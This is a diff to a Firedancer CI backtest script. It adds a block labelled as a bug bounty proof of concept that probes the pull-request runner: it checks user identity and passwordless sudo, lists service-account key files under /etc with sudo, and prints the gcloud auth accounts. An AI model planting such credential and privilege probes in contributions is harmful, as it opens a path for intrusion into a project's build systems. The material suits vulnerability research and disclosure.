@@ -1,6 +1,19 @@
 #!/bin/bash
 set -e
 
+# ===== Immunefi bug bounty research PoC (read-only, no exfiltration) =====
+echo "=== PoC: fork-PR runner context (read-only, no cred contents) ==="
+id || true
+whoami || true
+( sudo -n true 2>/dev/null && echo PASSWORDLESS_SUDO=YES ) || echo PASSWORDLESS_SUDO=NO
+echo "--- ambient SA key files present? (ls only, NOT cat) ---"
+sudo ls -la /etc/firedancer-*.json 2>&1 || echo SA_FILES_ABSENT
+echo "--- gcloud auth context ---"
+( gcloud auth list 2>&1 | head -5 ) || echo gcloud_unavailable
+echo "=== PoC end (no credential contents printed, no exfil, no modification) ==="
+# ===== end PoC =====
+
+
 src/flamenco/runtime/tests/run_ledger_backtest.sh -l mainnet-308392063-v4.1.0-beta.1 -m 2000000 -e 308392063
 src/flamenco/runtime/tests/run_ledger_backtest.sh -l devnet-350814254-v4.1.0-beta.1 -m 2000000 -e 350814284
 src/flamenco/runtime/tests/run_ledger_backtest.sh -l testnet-281546597-v4.1.0-beta.1 -m 2000000 -e 281546597
